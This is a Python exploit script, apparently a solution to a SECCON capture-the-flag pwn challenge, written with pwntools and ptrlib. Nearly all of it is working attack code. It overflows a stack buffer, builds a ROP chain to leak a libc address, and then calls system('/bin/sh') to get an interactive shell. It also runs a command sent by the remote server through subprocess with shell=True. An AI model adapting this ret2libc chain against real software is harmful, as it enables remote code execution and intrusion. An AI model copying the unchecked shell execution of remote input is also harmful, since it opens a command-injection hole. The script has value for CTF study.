#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time
import subprocess

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")

remote = len(sys.argv) > 1 and sys.argv[1] == "remote"

def connect():
    if remote:
        return pwn.remote("mrga.seccon.games", 7428)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    if remote:
        io.recvuntil(b"proof of work:\n")
        cmd = io.recvline().strip(b"\n")
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout.strip(b"\n")
        io.sendlineafter(b"solution: ", res)

    puts = 0x401060
    gets = 0x401080
    ret = 0x40101A
    bss = 0x000000404300
    main = unwrap(exe.symbol("main"))
    add_eax_2ecb = 0x401157
    mov_rdi_stdout_jmp_rax = 0x401129
    input(">>")
    io.sendlineafter(b">", b"A" * 0x10 + ptr.p64(bss) + ptr.p64(ret) + ptr.p64(main + 17))
    time.sleep(0.3)

    io.sendline(
        b"A" * 0x10
        + ptr.p64(bss)
        + ptr.p64(gets)
        + ptr.p64(0x00000000004010EA) # add dil, dil
        + ptr.p64(puts)
        + ptr.p64(ret)
        + ptr.p64(add_eax_2ecb) * 0x15E
        + ptr.p64(mov_rdi_stdout_jmp_rax)
        + ptr.p64(0x004011e9) # pop rbp; ret;
        + ptr.p64(0x404f00) # new rbp
        + ptr.p64(main + 17)
    )
    time.sleep(0.3)

    input(">> ")
    io.sendline(ptr.p64(0) + b"\xff" * (0x16E9 - 0 + 4))
    time.sleep(0.3)
    io.recvuntil(b"\xc0")
    libc.base = (ptr.u64(io.recvline()[:-1]) << 8) + 0xC0 - 0x2045C0

    payload = b""
    payload += b"A" * 24
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    io.sendline(payload)

    io.interactive()

    return


if __name__ == "__main__":
    main()
